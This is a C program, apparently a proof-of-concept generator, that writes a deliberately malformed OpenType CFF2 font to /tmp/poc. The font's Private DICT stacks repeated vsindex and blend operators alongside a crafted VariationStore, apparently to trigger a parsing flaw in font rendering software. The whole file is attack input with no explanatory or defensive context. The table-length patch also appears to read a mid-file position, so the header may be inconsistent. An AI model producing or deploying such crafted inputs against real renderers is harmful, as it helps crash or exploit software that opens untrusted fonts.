#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

static void write_be16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_be32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    fwrite("OTTO", 1, 4, f);
    write_be16(f, 1); /* numTables = 1 */
    write_be16(f, 0); /* searchRange */
    write_be16(f, 0); /* entrySelector */
    write_be16(f, 0); /* rangeShift */

    /* Table record for 'CFF2' */
    fwrite("CFF2", 1, 4, f);
    write_be32(f, 0); /* checksum placeholder */
    long offset_pos = ftell(f);
    write_be32(f, 0); /* offset placeholder */
    write_be32(f, 0); /* length placeholder */

    uint32_t cff_start = ftell(f);

    /* CFF2 Header: 5 bytes */
    fputc(0x02, f);
    fputc(0x00, f);
    fputc(0x05, f);
    fputc(0x01, f);
    fputc(0x00, f);

    /* topDictLength placeholder */
    long top_dict_len_pos = ftell(f);
    write_be16(f, 0);

    /* Top DICT */
    fputc(0x8c, f); fputc(0x00, f); /* version 1 */

    /* CharStrings operator (12 0) */
    long top_dict_charstrings_pos = ftell(f);
    fputc(0x1c, f); write_be16(f, 0);
    fputc(0x0c, f); fputc(0x00, f);

    /* FDArray operator (12 36) */
    long top_dict_fdarray_pos = ftell(f);
    fputc(0x1c, f); write_be16(f, 0);
    fputc(0x0c, f); fputc(0x24, f);

    /* FDSelect operator (12 37) */
    long top_dict_fdselect_pos = ftell(f);
    fputc(0x1c, f); write_be16(f, 0);
    fputc(0x0c, f); fputc(0x25, f);

    /* VariationStore operator (12 38) */
    long top_dict_varstore_pos = ftell(f);
    fputc(0x1c, f); write_be16(f, 0);
    fputc(0x0c, f); fputc(0x26, f);

    long top_dict_end = ftell(f);
    uint32_t top_dict_len = top_dict_end - top_dict_len_pos - 2;
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_be16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* CharStrings INDEX: one glyph with simple endchar */
    long charstrings_start = ftell(f);
    uint32_t charstrings_offset = charstrings_start - cff_start;
    write_be32(f, 1);
    fputc(1, f);
    fputc(1, f);
    fputc(2, f);
    fputc(0x0e, f); /* endchar */

    /* Global Subr INDEX (empty) */
    write_be32(f, 0);

    /* FDArray INDEX */
    long fdarray_start = ftell(f);
    uint32_t fdarray_offset = fdarray_start - cff_start;

    /* Font DICT: contains Private operator */
    uint8_t font_dict[32];
    int fd_len = 0;
    font_dict[fd_len++] = 0x1c;
    font_dict[fd_len++] = 0x00;
    font_dict[fd_len++] = 0x00;
    font_dict[fd_len++] = 0x1c;
    font_dict[fd_len++] = 0x00;
    font_dict[fd_len++] = 0x00;
    font_dict[fd_len++] = 0x12; /* Private */

    write_be32(f, 1);
    fputc(1, f);
    fputc(1, f);
    fputc((uint8_t)(fd_len + 1), f);
    fwrite(font_dict, 1, fd_len, f);

    /* FDSelect: format 0, 1 glyph, FD = 0 */
    long fdselect_start = ftell(f);
    uint32_t fdselect_offset = fdselect_start - cff_start;
    fputc(0x00, f); /* format 0 */
    write_be16(f, 1); /* nGlyphs = 1 */
    fputc(0x00, f); /* FD for glyph 0 = 0 */

    /* Private DICT with two blend operators */
    long private_start = ftell(f);
    uint32_t private_offset = private_start - cff_start;

    int numBlends = 10;

    /* vsindex operator */
    fputc(0x8b, f); /* push 0 */
    fputc(0x16, f); /* vsindex */

    /* First blend */
    int i;
    for (i = 0; i < numBlends; i++) {
        fputc(0x8b, f); fputc(0x8b, f); fputc(0x8b, f); fputc(0x8b, f);
        fputc(0x8b, f);
    }
    fputc(0x95, f); /* push 10 */
    fputc(0x17, f); /* blend */

    /* Second blend */
    fputc(0x8b, f); /* push 0 */
    fputc(0x16, f); /* vsindex */

    for (i = 0; i < numBlends; i++) {
        fputc(0x8b, f); fputc(0x8b, f); fputc(0x8b, f); fputc(0x8b, f);
        fputc(0x8b, f);
    }
    fputc(0x95, f); /* push 10 */
    fputc(0x17, f); /* blend */

    long private_end = ftell(f);
    uint32_t private_size = private_end - private_start;

    /* Patch Private operands in Font DICT */
    long font_dict_private_pos = fdarray_start + 4 + 1 + 2;
    fseek(f, font_dict_private_pos, SEEK_SET);
    fputc(0x1c, f);
    write_be16(f, private_size);
    fputc(0x1c, f);
    write_be16(f, private_offset);

    /* Patch Top DICT CharStrings */
    fseek(f, top_dict_charstrings_pos, SEEK_SET);
    fputc(0x1c, f);
    write_be16(f, charstrings_offset);

    /* Patch Top DICT FDArray */
    fseek(f, top_dict_fdarray_pos, SEEK_SET);
    fputc(0x1c, f);
    write_be16(f, fdarray_offset);

    /* Patch Top DICT FDSelect */
    fseek(f, top_dict_fdselect_pos, SEEK_SET);
    fputc(0x1c, f);
    write_be16(f, fdselect_offset);

    /* Build VariationStore at end of file */
    fseek(f, 0, SEEK_END);
    long varstore_start = ftell(f);
    uint32_t varstore_offset = varstore_start - cff_start;

    /* VarStore format 1 */
    write_be16(f, 1); /* format (2 bytes) */
    write_be32(f, 8); /* variationRegionListOffset = 8 */
    write_be16(f, 2); /* itemVariationDataCount = 2 */

    /* VariationRegionList at offset 8 */
    write_be16(f, 1); /* axisCount = 1 */
    write_be16(f, 2); /* regionCount = 2 */
    /* Region 0 */
    write_be16(f, 0); /* start = 0 */
    write_be16(f, 0); /* peak = 0 */
    write_be16(f, 0x4000); /* end = 1.0 */
    /* Region 1 */
    write_be16(f, 0); /* start = 0 */
    write_be16(f, 0x4000); /* peak = 1.0 */
    write_be16(f, 0x4000); /* end = 1.0 */

    /* ItemVariationData 0 */
    write_be16(f, 1); /* regionIndexCount = 1 */
    write_be16(f, 0); /* regionIndex = 0 */
    write_be16(f, 0); /* shortDeltaCount = 0 */
    write_be16(f, 1); /* itemCount = 1 */
    fputc(0x00, f); /* delta byte */

    /* ItemVariationData 1 */
    write_be16(f, 1); /* regionIndexCount = 1 */
    write_be16(f, 1); /* regionIndex = 1 */
    write_be16(f, 0); /* shortDeltaCount = 0 */
    write_be16(f, 1); /* itemCount = 1 */
    fputc(0x00, f); /* delta byte */

    /* Patch Top DICT VariationStore */
    fseek(f, top_dict_varstore_pos, SEEK_SET);
    fputc(0x1c, f);
    write_be16(f, varstore_offset);

    /* Patch table record */
    uint32_t cff_end = ftell(f);
    uint32_t cff_length = cff_end - cff_start;
    fseek(f, offset_pos, SEEK_SET);
    write_be32(f, cff_start);
    write_be32(f, cff_length);

    fclose(f);
    return 0;
}